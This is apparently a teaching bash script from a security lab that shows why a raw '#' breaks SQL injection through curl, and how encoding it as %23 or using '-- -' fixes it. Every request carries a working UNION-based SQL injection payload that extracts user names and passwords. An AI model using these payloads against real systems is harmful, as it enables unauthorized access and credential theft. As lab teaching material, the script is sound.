#!/usr/bin/env bash
# seg_comentario.sh — GOTCHA (Short): el # como comentario SQL en una URL.
# En una direccion web, el # marca un fragmento -> curl lo corta y lo de detras NUNCA llega al
# servidor, asi que la inyeccion se rompe en silencio. Fix: codificar # como %23, o usar -- -.
# Solo contra sistemas propios. Laboratorio aislado. Morini Computers - Ciberseguridad.
source /root/sqli_login.sh low >/dev/null 2>&1
datos(){ grep -oP "(?<=<pre>).*?(?=</pre>)" | sed "s#<br />#  |  #g"; }

echo "[1] # como comentario SQL, SIN codificar (curl lo trata como fragmento):"
curl -s -b "$COOKIE" "$U?id=0%27+UNION+SELECT+user,password+FROM+users+#&Submit=Submit" | datos
echo "    -> vacio: el # y todo lo de detras nunca llego al servidor"
echo
echo "[2] mismo ataque, pero con el # codificado como %23:"
curl -s -b "$COOKIE" "$U?id=0%27+UNION+SELECT+user,password+FROM+users+%23&Submit=Submit" | datos | head -3
echo
echo "[3] o usando el otro comentario SQL: dos guiones y un espacio (-- -):"
curl -s -b "$COOKIE" "$U?id=0%27+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" | datos | head -3
